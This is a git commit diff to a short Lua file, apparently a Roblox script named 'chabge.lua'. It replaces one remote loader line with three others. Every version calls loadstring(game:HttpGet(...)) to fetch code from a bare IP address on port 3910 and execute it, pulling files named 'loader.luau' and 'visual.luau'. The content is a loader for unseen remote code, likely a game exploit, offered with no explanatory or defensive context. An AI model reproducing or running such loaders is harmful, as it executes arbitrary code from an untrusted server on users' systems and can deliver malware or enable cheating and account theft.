57d6a45fdb98a58c983dbd4ccf1f0d8a4d332b4e
apppor <vaporppaypal@gmail.com>
2026-02-04 22:29:18 +0000

    Update chabge.lua

--- chabge.lua
+++ chabge.lua
@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+ID="04415755-97f1-4b34-90d0-3ee09c0be918";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
